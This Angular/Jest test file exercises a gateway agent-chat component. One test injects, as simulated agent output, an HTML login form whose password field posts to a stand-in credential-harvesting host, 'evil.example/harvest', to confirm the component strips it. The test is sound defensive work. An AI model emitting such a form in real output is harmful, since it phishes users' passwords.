/*
 * Copyright (C) 2024 The Gravitee team (http://gravitee.io)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
import { TestbedHarnessEnvironment } from '@angular/cdk/testing/testbed';
import { signal, WritableSignal } from '@angular/core';
import { ComponentFixture, TestBed } from '@angular/core/testing';
import { MatIconTestingModule } from '@angular/material/icon/testing';

import { AgentChatComponent } from './agent-chat.component';
import { AgentChatComponentHarness } from './agent-chat.harness';
import { AgentChatStore, ChatTurn } from './agent-chat.store';
import { AppTestingModule } from '../../testing/app-testing.module';

const TARGET = { endpoint: 'https://gw.test/agent', apiKey: 'key-1' };

describe('AgentChatComponent', () => {
  let fixture: ComponentFixture<AgentChatComponent>;
  let harness: AgentChatComponentHarness;
  let turns: WritableSignal<ChatTurn[]>;
  let isStreaming: WritableSignal<boolean>;
  let error: WritableSignal<string | null>;
  let send: jest.Mock;

  const agentTurn = (text: string, isComplete: boolean): ChatTurn => ({ id: 't1', role: 'agent', text, isComplete });

  /** Dispatches a real cancelable Enter and reports whether the component swallowed it. */
  const pressEnter = (): boolean => {
    const textarea = fixture.nativeElement.querySelector('textarea') as HTMLTextAreaElement;
    const event = new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true });
    textarea.dispatchEvent(event);
    fixture.detectChanges();
    return event.defaultPrevented;
  };

  beforeEach(async () => {
    turns = signal<ChatTurn[]>([]);
    isStreaming = signal(false);
    error = signal<string | null>(null);
    send = jest.fn().mockResolvedValue(undefined);

    await TestBed.configureTestingModule({
      imports: [AgentChatComponent, MatIconTestingModule, AppTestingModule],
      providers: [{ provide: AgentChatStore, useValue: { turns, isStreaming, error, send, resetFor: jest.fn() } }],
    }).compileComponents();

    fixture = TestBed.createComponent(AgentChatComponent);
    fixture.componentRef.setInput('agentName', 'Incident Commander');
    fixture.componentRef.setInput('applicationName', 'My App');
    fixture.componentRef.setInput('target', TARGET);
    harness = await TestbedHarnessEnvironment.harnessForFixture(fixture, AgentChatComponentHarness);
    fixture.detectChanges();
  });

  it('names the agent and the application whose key is used', async () => {
    const header = await harness.getHeaderText();

    expect(header).toContain('Incident Commander');
    expect(header).toContain('My App');
  });

  it('invites the viewer to start before anything has been said', async () => {
    expect(await harness.getEmptyStateText()).toContain('Incident Commander');
  });

  it('sends what was typed and clears the composer', async () => {
    await harness.type('what happened?');
    await harness.clickSend();

    expect(send).toHaveBeenCalledWith('what happened?', TARGET);
    expect(await harness.getComposerValue()).toBe('');
  });

  it('sends on enter, so a conversation flows without reaching for the mouse', async () => {
    await harness.type('what happened?');

    expect(pressEnter()).toBe(true);
    expect(send).toHaveBeenCalledWith('what happened?', TARGET);
  });

  it('does not send on shift+enter, which is how a question gets a second line', async () => {
    await harness.type('first line');
    await harness.pressEnter({ shift: true });

    expect(send).not.toHaveBeenCalled();
    expect(await harness.getComposerValue()).toBe('first line');
  });

  it('leaves enter alone when there is nothing to send, so the composer keeps its newline', async () => {
    await harness.type('   ');

    expect(pressEnter()).toBe(false);
    expect(send).not.toHaveBeenCalled();
  });

  it('leaves enter alone while the agent is answering', async () => {
    await harness.type('a follow-up');
    isStreaming.set(true);
    fixture.detectChanges();

    expect(pressEnter()).toBe(false);
    expect(send).not.toHaveBeenCalled();
  });

  it('will not send a blank message', async () => {
    await harness.type('   ');

    expect(await harness.isSendDisabled()).toBe(true);
  });

  it('will not send another message while the agent is still answering', async () => {
    await harness.type('anything');
    isStreaming.set(true);
    fixture.detectChanges();

    expect(await harness.isSendDisabled()).toBe(true);
  });

  it('puts a failed question back in the composer instead of losing it', async () => {
    send.mockImplementation(async () => {
      error.set('The gateway answered 401.');
    });

    await harness.type('a long, carefully worded question');
    await harness.clickSend();
    fixture.detectChanges();

    expect(await harness.getComposerValue()).toBe('a long, carefully worded question');
  });

  it('renders a streaming answer as plain text, so half-formed markdown does not flicker', async () => {
    turns.set([agentTurn('**bol', false)]);
    fixture.detectChanges();

    expect(await harness.hasMarkdownViewer()).toBe(false);
    expect(await harness.getPlainTurnTexts()).toEqual(['**bol']);
  });

  it('renders a finished answer as markdown', async () => {
    turns.set([agentTurn('**bold**', true)]);
    fixture.detectChanges();

    expect(await harness.hasMarkdownViewer()).toBe(true);
  });

  it('strips html an agent put in its answer, so it cannot render a login form', async () => {
    turns.set([agentTurn('Sign in:\n<form action="https://evil.example/harvest"><input type="password"><button>Go</button></form>', true)]);
    fixture.detectChanges();
    await fixture.whenStable();

    expect(fixture.nativeElement.querySelector('form')).toBeNull();
    expect(fixture.nativeElement.querySelector('input[type=password]')).toBeNull();
    expect(fixture.nativeElement.innerHTML).not.toContain('evil.example');
  });

  it('renders a question as plain text, never as markdown', async () => {
    turns.set([{ id: 'u1', role: 'user', text: '**not markdown**', isComplete: true }]);
    fixture.detectChanges();

    expect(await harness.hasMarkdownViewer()).toBe(false);
    expect(await harness.getPlainTurnTexts()).toEqual(['**not markdown**']);
  });

  it('shows a failure', async () => {
    error.set('The gateway answered 401.');
    fixture.detectChanges();

    expect(await harness.getErrorText()).toContain('401');
  });

  it('shows no failure when there is none', async () => {
    expect(await harness.getErrorText()).toBeNull();
  });

  it('lets a keyboard user reach the transcript to scroll it', () => {
    const log = fixture.nativeElement.querySelector('.agent-chat__log') as HTMLElement;

    expect(log.getAttribute('tabindex')).toBe('0');
  });
});
